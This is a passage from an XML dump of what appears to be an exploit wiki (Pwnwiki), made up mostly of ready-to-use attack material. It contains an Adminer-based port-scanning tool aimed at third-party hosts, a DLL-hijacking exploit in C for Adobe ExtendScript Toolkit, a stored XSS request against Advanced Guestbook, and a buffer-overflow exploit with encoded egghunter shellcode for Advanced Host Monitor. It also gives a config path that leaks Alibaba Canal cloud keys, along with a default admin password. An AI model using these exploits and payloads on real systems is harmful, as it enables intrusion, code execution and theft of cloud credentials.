        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ADMINER,int(ADMINER_PORT)))
        s=ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23)
        s.close()
    except Exception as e:
        print ""
        return False
    return True


def version(ip,port,uri,use_ssl):
    res=""
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip,int(port)))
        if use_ssl:
            s=ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23) 
        s.send('GET '+'/'+uri+'/?server='+':'+'&amp;username=\r\n\r\n')

    except Exception as e:
        print 'Host up but cant connect.' #str(e)
        print 'Re-check Host/Port/URI.'
        s.close()
        return 504
     
    while True:
        RES=s.recv(512)
        if RES.find('Forbidden')!=-1:
            print 'Forbidden 403'
            s.close()
            return None
        if RES.find('401 Authorization Required')!=-1:
            print '401 Authorization Required'
            s.close()
            return None
        ver = re.findall(r'&lt;span&gt;(.*)&lt;/span&gt;',RES,re.DOTALL|re.MULTILINE)
        if not RES:
            s.close()
            return None
        if ver:
            print 'Your Adminer '+ ver[0] + ' works for us now.'
            s.close()
            return ver

    s.close()
    return None
 
       
               
def scan(ADMINER,ADMINER_PORT,ADMINER_URI,TARGET,PORTS_TO_SCAN,PRINT_CLOSED,USE_SSL):
    global MAX_TIME,port_range
    RES=''

    print 'scanning ports: %s ' % str(port_range[0])+'to ' + str(port_range[-1])+' ...'
    
    for aPort in port_range: 
         aPort=str(aPort)
         
         try:
             s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(MAX_TIME)
             s.connect((ADMINER,ADMINER_PORT))
    
             if USE_SSL:
                s=ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23) 

             s.send('GET /'+ADMINER_URI+'/?server='+TARGET+':'+aPort+'&amp;username= HTTP/1.1\r\nHost: '+TARGET+'\r\n\r\n')
    
         except Exception as e:
              print str(e)
              s.close()
              return

         while True:
              try:
                 RES=s.recv(512)
                 ###print RES
                 ###Should see HTTP/1.1 403 not 200
                 if RES.find('HTTP/1.1 200 OK')!=-1:
                     print 'port '+aPort +  ' open'
                     port_lst.append(aPort+' open')
                     s.close()
                     break
                    
                 if RES.find('400 Bad Request')!=-1:
                     print '400 Bad Request, check params'
                     s.close()
                     break
                     raw_input()                  

                 lst=re.findall(r"([^\n&lt;div&gt;].*connect to MySQL server on.*[^&lt;/div&gt;\n])|(Lost connection to MySQL server at.*)|(MySQL server has gone away.*)"+
                             "|(No connection could be made because the target machine actively refused it.*)|(A connection attempt failed.*)|(HTTP/1.1 200 OK.*)", RES)     
        
                 if lst:
                      status=str(lst)
                      if status.find('connect to MySQL')!=-1:
                          if PRINT_CLOSED:
                              print 'port '+ aPort +  ' closed'
                          s.close()
                          break
                      elif status.find('machine actively refused it.')!=-1:
                          if PRINT_CLOSED:
                              print 'port '+ aPort +  ' closed'
                          s.close()
                          break
                      elif status.find('A connection attempt failed')!=-1:
                          if PRINT_CLOSED:
                               print 'port '+ aPort +  ' closed'
                          s.close()
                          break
                      elif status.find('reading initial communication packet')!=-1:
                          print 'port '+aPort +  ' open'
                          port_lst.append(aPort+' open')
                          s.close()
                          break
                      elif status.find('MySQL server has gone away')!=-1:
                          print 'port '+aPort +  ' open'
                          port_lst.append(aPort+' open')
                          s.close()
                          break
                      elif status.find('Bad file descriptor')!=-1:
                          print 'port '+aPort +  ' open'
                          port_lst.append(aPort+' open')
                          s.close()
                          break
                      elif status.find('Got packets out of order')!=-1:
                          print 'port '+aPort +  ' open'
                          s.close()
                          break
                        
              except Exception  as e:
                  msg = str(e)
                  ###print msg
                  if msg.find('timed out')!=-1 and aPort in false_pos_ports:
                      print 'port '+aPort +  ' open'
                      port_lst.append(aPort+' open')
                      s.close()
                      break
                  elif msg.find('timed out')!=-1: 
                      print 'port '+aPort + ' timed out'
                      port_lst.append(aPort+' read operation timed out')
                      s.close()
                      break
                  else:
                      s.close()
                      break
               
    if port_lst:
        log(TARGET)
    else:
        print "Scan completed, no ports mined."
    return 0



def arp(host):
    args = "-a" if system_name().lower()=="windows" else "-e"
    return subprocess.call("arp " + args + " " + host, shell=True) == 0
         

def ping_host(host):
    args = "-n 1" if system_name().lower()=="windows" else "-c 1"
    res=subprocess.call("ping " + args + " " + host, shell=True) == 0
    if not res:
        print str(host) + ' down? trying ARP'
        if not arp(host):
            print str(host) + ' unreachable.'
            return
    return res

    

def main():
    global port_range
    print BANNER
    greet()
    ADMINER_VERSION=False
    PRINT_CLOSED=False
    USE_SSL=None

    ADMINER=raw_input('[+] Adminer Host/IP&gt; ')
    if ADMINER=='':
        print 'Enter valid Host/IP'
        ADMINER=raw_input('[+] Adminer Host/IP&gt; ')
    
    ADMINER_PORT=raw_input('[+] Adminer Port&gt; ')
    if not re.search("^\d{1,5}$",ADMINER_PORT):
        print 'Enter a valid Port.'
        ADMINER_PORT=raw_input('[+] Adminer Port&gt; ')
    
    ADMINER_URI=raw_input('[+] Adminer URI [the adminer-&lt;version&gt;.php OR adminer/ dir path] &gt; ')
    TARGET=raw_input('[+] Host/IP to Scan&gt; ')
    
    PORTS_TO_SCAN=raw_input('[+] Port Range e.g. 21-25&gt; ').replace(' ','')
    plst=re.findall(r"(\d{1,5})-(\d{1,5})",PORTS_TO_SCAN)
    if not plst:
        print 'Invalid ports, format is 1-1025'
        return
        raw_input() #console up

    port_range=chk_ports(PORTS_TO_SCAN)
    if not port_range:
        return

    PRINT_CLOSED=raw_input('[+] Print closed ports? 1=Yes any key for No&gt; ')
    if PRINT_CLOSED=='1':
        PRINT_CLOSED=True
    else:
        PRINT_CLOSED=False
    
    if not ping_host(ADMINER):
        print 'host %s not reachable or blocking ping ' % ADMINER  
        cont=raw_input('Continue with scan? 1=Yes any key for No&gt; ')
        if cont!='1':
            print 'Scan aborted.'
            raw_input() #console up
            return
        

    USE_SSL=use_ssl(ADMINER,ADMINER_PORT)
    time.sleep(2)
    ADMINER_VERSION = version(ADMINER,ADMINER_PORT,ADMINER_URI,USE_SSL)

    if not ADMINER_VERSION:
        print "Can't retrieve Adminer script. check supplied URI."
        raw_input() #console up
        return
    else:
        if ADMINER_VERSION==504:
            raw_input() #console up
            return
        if scan(ADMINER,int(ADMINER_PORT),ADMINER_URI,TARGET,PORTS_TO_SCAN,PRINT_CLOSED,USE_SSL)==0:
            more=raw_input('Info: 1=Yes, any key for No&gt; ')
            if more=='1':
                info()
                raw_input() #console up

    
if __name__=='__main__':
    main()
&lt;/pre&gt;</text>
      <sha1>onqrx5yx7c9m32evxfzaax10kong2vi</sha1>
    </revision>
  </page>
  <page>
    <title>Adobe ExtendScript Toolkit CS4 DLL劫持漏洞</title>
    <ns>0</ns>
    <id>494</id>
    <revision>
      <id>696</id>
      <timestamp>2021-03-27T03:05:32Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; 1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0 0     _                   __           __       __                     1 1   /' \..."</comment>
      <origin>696</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2728" sha1="e6aa6amze5nouctjlept96toshuci6v" xml:space="preserve">==EXP==
&lt;pre&gt;
1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_&lt;_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ &gt;&gt; Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : 1337day.com                                  0
1  [+] Support e-mail  : submit[at]1337day.com                        1
0                                                                      0
1               #########################################              1
0               I'm kalashinkov3 member from Inj3ct0r Team              1
1               #########################################              0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1

#########################################################
# Title : Adobe ExtendScript Toolkit CS4 DLL Hijacking Exploit
# Author: Kalashinkov3
# Home : 13000/ ALGERIA / 1337day.com
# Email : kalashinkov3[at]Hotmail[dot]Fr
# Date : 26/06/2011
# Category  : Local Exploit
# Tested on: [Windows Xp Sp3 Fr]      
######################################################### 

# File Vulnerable:

- ExtendScript Toolkit.exe

# Vulnerable extensions:

- .js

# Vulnerable Dll's:

- dwmapi.dll




./

#include &lt;windows.h&gt;
#define DllExport __declspec (dllexport)

DllExport void hook_startup() { exp(); }

int exp()
{
  WinExec("calc", 0);
  exit(0);
  return 0;
}



^_^ GOOD LUCK ALL :)

+ Greets To==================================================================+
                                                                             +
BrOx-dz, KedAns-Dz, Caddy-Dz, KnocKout, toxic-kim, [Lila Far=&gt;D], Keinji1258 +
ALLA Foundou,586, 1337day.com, packetstormsecurity.org, Exploit-id.com       +
andhrahackers.com, 1337day.com/team, id-backtrack.com, dis9.com/team         +
               # all Algerians Hacker'S ;), All My Friends #                 +
                        &lt;3 I Love You Lila  &lt;3                               +
                                                                             +
=============================================================================+

&lt;/pre&gt;</text>
      <sha1>e6aa6amze5nouctjlept96toshuci6v</sha1>
    </revision>
  </page>
  <page>
    <title>Advanced Guestbook 2.4.4 - 'Smilies' XSS漏洞</title>
    <ns>0</ns>
    <id>2402</id>
    <revision>
      <id>2890</id>
      <timestamp>2021-05-17T10:25:31Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==XSS== &lt;pre&gt; # Exploit Title: Advanced Guestbook 2.4.4 - 'Smilies' Persistent Cross-Site Scripting (XSS) # Date: 17/08/2021 # Exploit Author: Abdulkadir AYDOGAN # Vendor Home..."</comment>
      <origin>2890</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2268" sha1="d6lhd3kcwrdsmaib0c9zjy23biivipq" xml:space="preserve">==XSS==
&lt;pre&gt;
# Exploit Title: Advanced Guestbook 2.4.4 - 'Smilies' Persistent Cross-Site Scripting (XSS)
# Date: 17/08/2021
# Exploit Author: Abdulkadir AYDOGAN
# Vendor Homepage: https://www.ampps.com/apps/guestbooks/Advanced_Guestbook
# Software Link: https://www.ampps.com/apps/guestbooks/Advanced_Guestbook
# Version: 2.4.4

Advanced Guestbook is a free open source guestbook script developed in PHP.
Examples of features include email notifications, uploading pictures, html
tags handling, multiple polls, comments and themes.

#Description
The following is PoC to use the XSS bug with authorized user.

Firstly there are four part of a emotion object which is :

- Emotion icon
- Emotion file name
- Emotion command which will be used to call this object (s_code)
- Emotion description (s_emotion)

Here is the exploitation steps for vulnerability:

1. Login to your admin account.
2. Go to "Smilies" tab to view and edit emotion icons
3. Click "edit" text in the "Action" column to edit emotions
4. Change emotion description to Javascript code
5. Click the "Submit Settings"
6. Click "Smilies" tab again to view all emotions and Javascript code will
be executed

# Vulnerable Parameter Type: POST
# Vulnerable Parameter: s_emotion
# Attack Pattern: &lt;script&gt;alert("Smile more!")&lt;/script&gt;

#PoC
HTTP Request:

POST /advancedguestbook/admin.php HTTP/1.1
Host: HOST_ADDRESS
Content-Length: 175
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://HOST_ADDRESS
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer:
http://HOST_ADDRESS/advancedguestbook/admin.php?action=smilies&amp;session=17395de9919fffa0ac9476370c2c7ba0&amp;uid=1&amp;edit_smilie=7
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: _ga=GA1.2.2068746825.1621203842; _gid=GA1.2.1432458757.1621203842;
_gat=1
Connection: close

s_code=:cool:&amp;s_emotion=&lt;script&gt;alert("Smile
more!")&lt;/script&gt;&amp;edit_smilie=7&amp;uid=1&amp;session=17395de9919fffa0ac9476370c2c7ba0&amp;action=smilies&amp;add_smilies=1
&lt;/pre&gt;</text>
      <sha1>d6lhd3kcwrdsmaib0c9zjy23biivipq</sha1>
    </revision>
  </page>
  <page>
    <title>Advanced Host Monitor 11.92 beta 本地緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>1633</id>
    <revision>
      <id>2037</id>
      <timestamp>2021-05-02T05:01:37Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; #!/usr/bin/env python  #------------------------------------------------------------------------------------------------------------------------------------# # E..."</comment>
      <origin>2037</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="7973" sha1="63tczpbwhe1nosfg46ov7g8rwg12aww" xml:space="preserve">==EXP==
&lt;pre&gt;
#!/usr/bin/env python

#------------------------------------------------------------------------------------------------------------------------------------#
# Exploit: Advanced Host Monitor 11.92 beta - Local Buffer Overflow (EggHunter)                                                      #
# Date: 2019-03-18                                                                                                                   #
# Author: Peyman Forouzan                                                                                                            #
# Tested Against: Winxp SP2 32-64 bit - Win7 Enterprise SP1 32-64 bit - Win10 Enterprise 32-64 bit                                   #
# Software Download #1: https://www.ks-soft.net/download/hm1192.exe                                                                  #
# Software Download #2: https://www.ip-tools.biz/download/hm1192.exe                                                                 #
# Version: 11.92 beta                                                                                                                #
# The Program also has SEH Overflow, Which can be implemented in a similar way                                                       #
# Special Thanks to my wife                                                                                                          #
# Steps : Open the APP --&gt; Tools --&gt; Trace (or Telnet) --&gt; paste in contents from the egg.txt into "Host" --&gt; Start --&gt; Close        #
#         Advanced Host Monitor --&gt; Options --&gt; Startup --&gt; paste in contents from the egghunter-winxp-win7.txt or                   #
#         egghunter-win10.txt (depend on your windows version) into "load specific HTML file" --&gt; Save --&gt; Wait a litle --&gt;          #
#         Shellcode (Calc) open                                                                                                      #
#------------------------------------------------------------------------------------------------------------------------------------#
# "Egg" shellcode into memory --&gt; Egghunter field overflow: EIP overwrite                                                            #
#------------------------------------------------------------------------------------------------------------------------------------#

#---------------------------------------------------   EGG Shellcode Generation    ---------------------------------------------------

#msfvenom -p windows/exec cmd=calc.exe BufferRegister=EDI -e x86/alpha_mixed -f python -a x86 --platform windows -v egg
egg =  "w00tw00t"
egg += "\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
egg += "\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
egg += "\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
egg += "\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
egg += "\x79\x6c\x5a\x48\x4e\x62\x77\x70\x57\x70\x63\x30\x71"
egg += "\x70\x4b\x39\x5a\x45\x35\x61\x4f\x30\x52\x44\x4c\x4b"
egg += "\x52\x70\x46\x50\x6c\x4b\x53\x62\x54\x4c\x6c\x4b\x43"
egg += "\x62\x44\x54\x6c\x4b\x71\x62\x51\x38\x34\x4f\x6e\x57"
egg += "\x31\x5a\x36\x46\x55\x61\x6b\x4f\x4c\x6c\x37\x4c\x75"
egg += "\x31\x73\x4c\x45\x52\x54\x6c\x77\x50\x49\x51\x48\x4f"
egg += "\x34\x4d\x53\x31\x69\x57\x39\x72\x4a\x52\x62\x72\x43"
egg += "\x67\x6e\x6b\x71\x42\x52\x30\x4c\x4b\x70\x4a\x47\x4c"
egg += "\x6e\x6b\x62\x6c\x62\x31\x72\x58\x6a\x43\x70\x48\x33"
egg += "\x31\x4e\x31\x52\x71\x4c\x4b\x36\x39\x37\x50\x63\x31"
egg += "\x5a\x73\x4c\x4b\x42\x69\x52\x38\x68\x63\x57\x4a\x31"
egg += "\x59\x4e\x6b\x44\x74\x4c\x4b\x55\x51\x38\x56\x50\x31"
egg += "\x6b\x4f\x6e\x4c\x69\x51\x78\x4f\x46\x6d\x36\x61\x58"
egg += "\x47\x46\x58\x4b\x50\x52\x55\x39\x66\x65\x53\x71\x6d"
egg += "\x79\x68\x45\x6b\x31\x6d\x45\x74\x34\x35\x7a\x44\x52"
egg += "\x78\x4c\x4b\x62\x78\x77\x54\x47\x71\x58\x53\x75\x36"
egg += "\x6c\x4b\x34\x4c\x70\x4b\x6c\x4b\x52\x78\x35\x4c\x43"
egg += "\x31\x58\x53\x6c\x4b\x73\x34\x6e\x6b\x67\x71\x58\x50"
egg += "\x6c\x49\x73\x74\x45\x74\x55\x74\x63\x6b\x61\x4b\x33"
egg += "\x51\x32\x79\x51\x4a\x36\x31\x49\x6f\x4b\x50\x71\x4f"
egg += "\x71\x4f\x42\x7a\x6c\x4b\x44\x52\x48\x6b\x6e\x6d\x31"
egg += "\x4d\x50\x6a\x35\x51\x6e\x6d\x6f\x75\x48\x32\x55\x50"
egg += "\x75\x50\x53\x30\x46\x30\x55\x38\x74\x71\x4c\x4b\x72"
egg += "\x4f\x4e\x67\x69\x6f\x6b\x65\x4d\x6b\x5a\x50\x38\x35"
egg += "\x79\x32\x56\x36\x45\x38\x59\x36\x6a\x35\x6f\x4d\x6f"
egg += "\x6d\x69\x6f\x59\x45\x35\x6c\x64\x46\x31\x6c\x76\x6a"
egg += "\x4b\x30\x79\x6b\x4b\x50\x74\x35\x73\x35\x4d\x6b\x73"
egg += "\x77\x65\x43\x71\x62\x32\x4f\x50\x6a\x75\x50\x31\x43"
egg += "\x39\x6f\x5a\x75\x55\x33\x43\x51\x72\x4c\x45\x33\x44"
egg += "\x6e\x62\x45\x31\x68\x62\x45\x63\x30\x41\x41"

f = open ("egg.txt", "w")
f.write(egg)
f.close()

#-----------------------------------------------   EGG Hunter Shellcode Generation    ----------------------------------------------

#encode egghunter code produced by mona (looking for w00tw00t) into only alpha characters 

# EggHunter - Modified Version for Winxp and Win7 (32-64 bit)
egghunter =  "\x4c\x4c\x4c\x4c\x5f"
egghunter += "\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
egghunter += "\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58"
egghunter += "\x50\x30\x41\x35\x41\x6b\x41\x46\x51\x32\x41\x47"
egghunter += "\x32\x42\x47\x30\x42\x47\x41\x42\x58\x50\x38\x41"
egghunter += "\x47\x75\x4a\x49\x70\x66\x4c\x4c\x78\x4b\x6b\x30"
egghunter += "\x49\x6b\x54\x63\x42\x55\x74\x4a\x66\x51\x69\x4b"
egghunter += "\x36\x51\x38\x52\x36\x33\x52\x73\x36\x33\x36\x33"
egghunter += "\x38\x33\x4f\x30\x71\x76\x4d\x51\x6b\x7a\x39\x6f"
egghunter += "\x66\x6f\x47\x32\x36\x32\x4d\x50\x59\x6b\x59\x50"
egghunter += "\x33\x44\x57\x78\x43\x5a\x66\x62\x72\x78\x78\x4d"
egghunter += "\x44\x6e\x73\x6a\x7a\x4b\x37\x62\x52\x4a\x71\x36"
egghunter += "\x61\x48\x55\x61\x69\x59\x6f\x79\x79\x72\x70\x64"
egghunter += "\x59\x6f\x75\x43\x73\x6a\x6e\x63\x57\x4c\x71\x34"
egghunter += "\x47\x70\x42\x54\x76\x61\x72\x7a\x57\x4c\x37\x75"
egghunter += "\x74\x34\x7a\x76\x6c\x78\x72\x57\x46\x50\x76\x50"
egghunter += "\x63\x44\x6d\x59\x59\x47\x4e\x4f\x71\x65\x4e\x31"
egghunter += "\x6e\x4f\x51\x65\x38\x4e\x79\x6f\x4b\x57\x41\x41"

# EggHunter - Modified Version for Windows10 (32-64 bit)
egghunter10 =  "\x4c\x4c\x4c\x4c\x5f"
egghunter10 += "\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49"
egghunter10 += "\x49\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a"
egghunter10 += "\x41\x58\x50\x30\x41\x35\x41\x6b\x41\x46\x51"
egghunter10 += "\x32\x41\x47\x32\x42\x47\x30\x42\x47\x41\x42"
egghunter10 += "\x58\x50\x38\x41\x47\x75\x4a\x49\x4d\x53\x4a"
egghunter10 += "\x4c\x46\x50\x69\x57\x56\x64\x76\x44\x55\x50"
egghunter10 += "\x37\x70\x55\x50\x73\x30\x48\x47\x43\x74\x55"
egghunter10 += "\x74\x35\x54\x57\x70\x47\x70\x35\x50\x65\x50"
egghunter10 += "\x78\x47\x67\x34\x77\x54\x76\x68\x35\x50\x55"
egghunter10 += "\x50\x53\x30\x45\x50\x66\x51\x4a\x72\x61\x76"
egghunter10 += "\x4c\x4c\x58\x4b\x6f\x70\x6b\x4b\x61\x33\x50"
egghunter10 += "\x75\x63\x32\x4c\x73\x4f\x30\x70\x66\x4b\x31"
egghunter10 += "\x6a\x6a\x49\x6f\x64\x4f\x62\x62\x73\x62\x4d"
egghunter10 += "\x50\x69\x6b\x79\x50\x30\x74\x64\x4b\x53\x58"
egghunter10 += "\x6b\x76\x63\x31\x75\x50\x37\x70\x70\x58\x5a"
egghunter10 += "\x6d\x54\x6e\x52\x7a\x68\x6b\x67\x61\x30\x31"
egghunter10 += "\x49\x4b\x73\x63\x51\x43\x30\x53\x32\x4a\x71"
egghunter10 += "\x39\x63\x68\x38\x33\x49\x50\x51\x74\x69\x6f"
egghunter10 += "\x66\x73\x6d\x53\x7a\x64\x66\x6c\x42\x7a\x55"
egghunter10 += "\x6c\x47\x75\x71\x64\x49\x44\x78\x38\x72\x57"
egghunter10 += "\x66\x50\x74\x70\x31\x64\x4f\x79\x4b\x67\x4c"
egghunter10 += "\x6f\x70\x75\x78\x4f\x6e\x4f\x44\x35\x48\x4c"
egghunter10 += "\x6b\x4f\x68\x67\x41\x41"

eip = "\x4d\x37\x41"

buffer = egghunter + "\x41" * (268 - len(egghunter)) + eip

f = open ("egghunter-winxp-win7.txt", "w")
f.write(buffer)
f.close()
buffer = egghunter10 + "\x41" * (268 - len(egghunter10)) + eip
f2 = open ("egghunter-win10.txt", "w")
f2.write(buffer)
f2.close()
            
&lt;/pre&gt;</text>
      <sha1>63tczpbwhe1nosfg46ov7g8rwg12aww</sha1>
    </revision>
  </page>
  <page>
    <title>Alibaba Canal config 云密鑰信息洩露漏洞</title>
    <ns>0</ns>
    <id>2280</id>
    <revision>
      <id>2715</id>
      <timestamp>2021-05-07T09:01:11Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==FOFA== &lt;pre&gt; title="Canal Admin" &lt;/pre&gt;  ==Payload== &lt;pre&gt; /api/v1/canal/config/1/0 &lt;/pre&gt;  其中洩露了 aliyun.access 密鑰，可以控制密鑰下的所有服務器..."</comment>
      <origin>2715</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="216" sha1="11bkd0ncmxabe5if5hec1uoskd2ljfg" xml:space="preserve">==FOFA==
&lt;pre&gt;
title="Canal Admin"
&lt;/pre&gt;

==Payload==
&lt;pre&gt;
/api/v1/canal/config/1/0
&lt;/pre&gt;

其中洩露了 aliyun.access 密鑰，可以控制密鑰下的所有服務器



其中還含有默認口令 admin/123456</text>
      <sha1>11bkd0ncmxabe5if5hec1uoskd2ljfg</sha1>
    </revision>
  </page>
  <page>
    <title>Android內核提權漏洞CVE-2019-2215 Binder UAF</title>
    <ns>0</ns>
    <id>238</id>
    <revision>
      <id>376</id>
      <timestamp>2021-03-17T13:10:16Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;language    /&gt;  ==POC== https://github.com/kangtastic/cve-2019-2215    &lt;translate&gt; ==參考== &lt;/translate&gt; LowRebSwrd：https://bbs.pediy.com/thread-264932.htm    KASAN https..."</comment>
      <origin>376</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="615" sha1="nwo5x2aauheca9ytr5atxgwzo051pst" xml:space="preserve">&lt;language    /&gt;

==POC==
https://github.com/kangtastic/cve-2019-2215
 

&lt;translate&gt;
==參考==
&lt;/translate&gt;
LowRebSwrd：https://bbs.pediy.com/thread-264932.htm
 

KASAN https://groups.google.com/g/syzkaller-bugs/c/QyXdgUhAF50/m/g-FXVo1OAwAJ
 

https://www.52pojie.cn/thread-1083552-1-1.html
 

https://hernan.de/blog/tailoring-cve-2019-2215-to-achieve-root/
 

https://bbs.pediy.com/thread-248444.htm
 

https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/drivers/android/binder.c?h=linux-4.14.y&amp;id=7a3cee43e935b9d526ad07f20bf005ba7e74d05b
 

https://www.youtube.com/watch?v=U2qvK1hJ6zg&amp;t=1618s</text>
      <sha1>nwo5x2aauheca9ytr5atxgwzo051pst</sha1>
    </revision>
    <revision>
      <id>377</id>
      <parentid>376</parentid>
      <timestamp>2021-03-17T13:10:44Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <origin>377</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="616" sha1="bdkrpcrre7oifqnrmkm1px5qknqa93u" xml:space="preserve">&lt;languages    /&gt;

==POC==
https://github.com/kangtastic/cve-2019-2215
 

&lt;translate&gt;
==參考==
&lt;/translate&gt;
LowRebSwrd：https://bbs.pediy.com/thread-264932.htm
 

KASAN https://groups.google.com/g/syzkaller-bugs/c/QyXdgUhAF50/m/g-FXVo1OAwAJ
 

https://www.52pojie.cn/thread-1083552-1-1.html
 

https://hernan.de/blog/tailoring-cve-2019-2215-to-achieve-root/
 

https://bbs.pediy.com/thread-248444.htm
 

https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/drivers/android/binder.c?h=linux-4.14.y&amp;id=7a3cee43e935b9d526ad07f20bf005ba7e74d05b
 

https://www.youtube.com/watch?v=U2qvK1hJ6zg&amp;t=1618s</text>
      <sha1>bdkrpcrre7oifqnrmkm1px5qknqa93u</sha1>
    </revision>
    <revision>
      <id>378</id>
      <parentid>377</parentid>
      <timestamp>2021-03-17T13:10:54Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>378</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="627" sha1="gss5ufvego3bi0xlt0wczcdcejjvxkk" xml:space="preserve">&lt;languages    /&gt;

==POC==
https://github.com/kangtastic/cve-2019-2215
 

&lt;translate&gt;
==參考== &lt;!--T:1--&gt;
&lt;/translate&gt;
LowRebSwrd：https://bbs.pediy.com/thread-264932.htm
 

KASAN https://groups.google.com/g/syzkaller-bugs/c/QyXdgUhAF50/m/g-FXVo1OAwAJ
 

https://www.52pojie.cn/thread-1083552-1-1.html
 

https://hernan.de/blog/tailoring-cve-2019-2215-to-achieve-root/
 

https://bbs.pediy.com/thread-248444.htm
 

https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/drivers/android/binder.c?h=linux-4.14.y&amp;id=7a3cee43e935b9d526ad07f20bf005ba7e74d05b
 

https://www.youtube.com/watch?v=U2qvK1hJ6zg&amp;t=1618s</text>
      <sha1>gss5ufvego3bi0xlt0wczcdcejjvxkk</sha1>
    </revision>
  </page>
  <page>
    <title>Android內核提權漏洞CVE-2019-2215 Binder UAF/en</title>
    <ns>0</ns>
    <id>243</id>
    <revision>
      <id>383</id>
      <timestamp>2021-03-17T13:12:04Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "Android kernel privilege escalation vulnerability CVE-2019-2215 Binder UAF"</comment>
      <origin>383</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="594" sha1="lb7r5wi0wrornmis1m4ws4pwiq5q9sj" xml:space="preserve">&lt;languages    /&gt;

==POC==
https://github.com/kangtastic/cve-2019-2215
 

==Reference==
LowRebSwrd：https://bbs.pediy.com/thread-264932.htm
 

KASAN https://groups.google.com/g/syzkaller-bugs/c/QyXdgUhAF50/m/g-FXVo1OAwAJ
 

https://www.52pojie.cn/thread-1083552-1-1.html
 

https://hernan.de/blog/tailoring-cve-2019-2215-to-achieve-root/
 

https://bbs.pediy.com/thread-248444.htm
 

https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/drivers/android/binder.c?h=linux-4.14.y&amp;id=7a3cee43e935b9d526ad07f20bf005ba7e74d05b
 

https://www.youtube.com/watch?v=U2qvK1hJ6zg&amp;t=1618s</text>
      <sha1>lb7r5wi0wrornmis1m4ws4pwiq5q9sj</sha1>
    </revision>
  </page>
  <page>
    <title>Android內核提權漏洞CVE-2019-2215 Binder UAF/fr</title>
    <ns>0</ns>
    <id>691</id>
    <revision>
      <id>925</id>
      <timestamp>2021-04-03T02:42:34Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Référence =="</comment>
      <origin>925</origin>
